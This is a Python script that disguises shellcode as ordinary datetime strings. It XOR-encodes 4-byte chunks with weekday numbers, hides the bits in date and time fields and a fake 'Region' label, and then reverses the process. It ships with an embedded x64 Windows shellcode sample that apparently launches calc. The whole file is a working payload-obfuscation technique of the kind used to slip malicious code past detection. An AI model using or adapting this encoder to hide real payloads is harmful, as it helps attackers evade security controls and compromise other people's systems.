# Declaring a global dict that will be used for xor encryption
global days
days = {
    'Monday': 1,
    'Tuesday': 2,
    'Wednesday': 3,
    'Thursday': 4,
    'Friday': 5,
    'Saturday': 6,
    'Sunday': 7
}

# Full region table: all 5 bits combinations covered
region_table = {
    "00000": "WORLD",
    "00001": "NORTH_AMERICA",
    "00010": "LATIN_AMERICA",
    "00011": "EUROPE",
    "00100": "EU_EASTERN",
    "00101": "EU_WESTERN",
    "00110": "EU_NORDIC",
    "00111": "EU_SOUTHERN",
    "01000": "ASIA",
    "01001": "EAST_ASIA",
    "01010": "SOUTH_ASIA",
    "01011": "SOUTHEAST_ASIA",
    "01100": "CENTRAL_ASIA",
    "01101": "PACIFIC",
    "01110": "MIDDLE_EAST",
    "01111": "NORTH_AFRICA",
    "10000": "SUB_SAHARAN_AFRICA",
    "10001": "AFRICA_EAST",
    "10010": "AFRICA_WEST",
    "10011": "AFRICA_CENTRAL",
    "10100": "AFRICA_SOUTH",
    "10101": "RUSSIA",
    "10110": "CIS",
    "10111": "CARIBBEAN",
    "11000": "OCEANIA",
    "11001": "AUSTRALIA_NEW_ZEALAND",
    "11010": "CENTRAL_AMERICA",
    "11011": "BALKANS",
    "11100": "BENELUX",
    "11101": "SCANDINAVIA",
    "11110": "MAGHREB",
    "11111": "GCC",
}

# Getting the inverse of the region dict. This will be used later to match regions to bit arrays
region_table_inv = {v: k for k, v in region_table.items()}

# Splitting shellcode in pairs of 4 since only 4 bytes will be hidden in datetime formats
def split_into_chunks(data, chunk_size=4):
    return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]

# Pad if necessary (we need groups of 4), encode and convert to datetime format
def encode_all(b):
    chunks = split_into_chunks(b, 4)
    results = []
    for chunk in chunks:
        if len(chunk) < 4:
            chunk = chunk.ljust(4, b'\x00')
        fields = encode_bytes_to_time(chunk) # This will encode/encrypt our bytes
        formatted = format_datetime(fields)  # This will format the result into datetime form
        results.append(formatted)
    return results

# Recovers the original shellcode
def decode_all(formatted_list):
    global days

    result = b""
    for formatted in formatted_list:
        parsed = parse_datetime_string(formatted) # Get each field from the datetime format
        
        # Based on each field, decode the shellcode
        recovered_chunk = decode_time_to_bytes(
            parsed['hour'], parsed['minute'], parsed['second'],
            parsed['day'], parsed['month'], parsed['year'],
            parsed['region'],
            parsed['utcgmt'],
            parsed['ampm']
        )
        
        
        # Finally xor with the weekday number
        key = days[parsed['weekday']]
        recovered_chunk_ = bytes([b ^ key for b in recovered_chunk])
        
        result += recovered_chunk_
 
    return result

# Hides the shellcode into datetime format    
def encode_bytes_to_time(b):
    import random
    
    global days
    
    # Get a random day
    random_day = random.choice(list(days.keys()))
    
    # Xor each byte of the 4-byte pair with the corresponding day number
    b_enc = bytes([bt ^ days[random_day] for bt in b])
    
    # Convert the 4-byte pair to a 32-bit array
    n = int.from_bytes(b_enc, 'big')
    bits = f"{n:032b}"

    # Assign the number of bits each field can hold (hide)
    raw_hour   = int(bits[0:5], 2)
    raw_minute = int(bits[5:11], 2)
    raw_second = int(bits[11:17], 2)
    raw_day    = int(bits[17:22], 2)
    raw_month  = int(bits[22:26], 2)
    raw_year   = int(bits[26:32], 2)

    xor_bits = ""

    # Xors field if it surprasses a given threshold. Example: Month cannot have a value greater than 12
    # Thus, we xor to create a valid looking time
    # We also create a bitarray associated with the field (hour:minute:second:day:month) that got xored to know how to reverse the process in the decryption phase
    def xor_if_needed(value, limit_min, limit_max, xor_val):
        nonlocal xor_bits
        if value<=limit_min or value >= limit_max:
            xor_bits += "1"
            return value ^ xor_val
        else:
            xor_bits += "0"
            return value

    # Further obfuscation through an equation system based on whether values surprass a specific threshold or not
    def obfuscate_time(hour, minute, second):
        if (hour+minute)<=23 and (minute+second)<=59 and (second+hour)<=59:
            hour_new = hour+minute
            minute_new = minute+second
            second_new = second+hour
            return hour_new, minute_new, second_new, "GMT"
        return hour, minute, second, "UTC"

    # Check if each field needs to be xored
    hour = xor_if_needed(raw_hour, -1, 24, 12)
    minute = xor_if_needed(raw_minute, -1, 60, 30)
    second = xor_if_needed(raw_second, -1, 60, 30)
    day = xor_if_needed(raw_day, 0, 31, 16)
    month = xor_if_needed(raw_month, 0, 13, 6)

    # Year is untouched
    year = raw_year

    # Map xor_bits to region. If no match is found, label it as "UNKNOWN"
    region = region_table.get(xor_bits.ljust(5, '0'), "UNKNOWN")

    # Further obfuscate shellcode in time fields through a math system
    hour, minute, second, utcgmt = obfuscate_time(hour, minute, second)
    
    # Append AM or PM depending on the time
    ampm = "AM" if hour >= 0 and hour <= 11 else "PM"

    return {
        'weekday': random_day,
        'hour': hour,
        'minute': minute,
        'second': second,
        'day': day,
        'month': month,
        'year': 1990 + year,
        'region': region,
        'ampm': ampm,
        'utcgmt': utcgmt
    }

# Convert from datetime to bytes by following the reverse operations
def decode_time_to_bytes(hour, minute, second, day, month, year, region, utcgmt, ampm):
    bits = ""

    xor_bits = region_table_inv.get(region, "00000")

    # Based on the region, get the corresponding bit array and reverse the xor in each field that has bit '1' set
    def reverse_xor(value, limit, xor_val, should_xor):
        if should_xor == "1":
            return value ^ xor_val
        else:
            return value
            
    # Solve the math system
    def solve_system(time_fields):
        x, y, z = time_fields
        b = (x + y - z) // 2
        a = x - b
        c = y - b
        return [a, b, c]

    # Obfuscation through equation system was set only when 'GMT' was set
    if utcgmt == 'GMT':
        hour, minute, second = solve_system([hour, minute, second])

    fields = [
        (hour, 24, 12),
        (minute, 60, 30),
        (second, 60, 30),
        (day, 32, 16),
        (month, 12, 6)
    ]

    # Reverse the xor operation - if applicable - and recover original bits
    for idx, (val, limit, xor_val) in enumerate(fields):
        real_val = reverse_xor(val, limit, xor_val, xor_bits[idx])
        bits += f"{real_val:0{[5,6,6,5,4][idx]}b}"

    # Subtract base 1990 from year to get the original bits
    year_bits = f"{year - 1990:06b}"
    bits += year_bits

    return int(bits, 2).to_bytes(4, 'big')

# Format the datetime str
def format_datetime(fields):
    return f"{fields['weekday']}, {fields['day']:02}/{fields['month']:02}/{fields['year']} {fields['hour']:02}:{fields['minute']:02}:{fields['second']:02} {fields['ampm']} {fields['utcgmt']} | Region={fields['region']}"

# Grep out each field
def parse_datetime_string(s):
    import re
    match = re.search(r'(Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday), (\d{2})/(\d{2})/(\d{4}) (\d{2}):(\d{2}):(\d{2}) (AM|PM) (UTC|GMT) \| Region=(\w+)', s)

    if not match:
        raise ValueError("Invalid datetime string format")

    weekday, month, day, year, hour, minute, second, ampm, utcgmt, region = match.groups()
    return {
        'weekday': weekday,
        'day': int(month),
        'month': int(day),
        'year': int(year),
        'hour': int(hour),
        'minute': int(minute),
        'second': int(second),
        'ampm': ampm,
        'utcgmt': utcgmt,
        'region': region
    }

# ================= Example Shellcode ==================
original = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00"

print(f"original shellcode: {original}")
datetimes = encode_all(original)
print("[+] Shellcode encoded to datetime strings:")
for d in datetimes:
    print(d)

recovered = decode_all(datetimes)
recovered = recovered[:len(original)]

print("[+] Recovering shellcode...")
print("[+] Recovered bytes:", recovered)

assert recovered == original, "Roundtrip failed!"

print("[+] Assertion passed successfully !!!")